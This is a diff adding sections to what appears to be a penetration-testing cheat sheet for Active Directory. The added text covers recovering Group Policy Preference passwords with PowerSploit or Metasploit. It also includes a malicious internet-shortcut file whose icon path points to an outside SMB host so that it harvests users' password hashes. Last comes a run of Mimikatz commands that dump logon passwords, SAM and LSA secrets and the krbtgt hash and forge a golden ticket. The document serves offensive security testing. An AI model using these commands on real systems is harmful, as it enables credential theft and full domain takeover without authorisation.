@@ -324,8 +324,45 @@ secretsdump.py <domain>/<user>:<password>@<IP>
   ```
 
 ### Abusing GPP
+  Use powersploit module Get-GPPPassword.ps1 or Metasploit module ‘auxiliary/scanner/smb/smb_enum_gpp’ or ‘post/windows/gather/credentials/gpp’ to automatically find and get the cleartext password.
 
-## ZeroLogon
+### URL File Attacks
+  in a share place the following internet shortcut to get hashes when users navigate to this in the share
+  ```html
+  [InternetShortcut]
+  URL=blah
+  WorkingDirectory=blah
+  IconFile=\\x.x.x.x\%USERNAME%.icon
+  IconIndex=1
+  ```
+  
+### Mimikatz Commands
+  ```cmd
+  privilege::debug
+  ```
+  ```cmd
+  sekurlsa::logonpasswords
+  ```
+  ```cmd
+  lsadump::sam
+  ```
+  ```cmd
+  lsadump::sam /patch
+  ```
+  ```cmd
+  lsadump::lsa /patch
+  ```
+  ```cmd
+  lsadump::lsa /inject /name:krbtgt
+  ```
+  ```cmd
+  kerberos::golden /User:Administrator /domain:<domain_> /sid:<Domain_sid> /krbtgt:<krbtgt_hash> /id:500 /ptt
+  ```
+  ```cmd
+  misc::cmd
+  ```
+  ## ZeroLogon
+
 
 ## Post Exploitation
 ### File Transfers
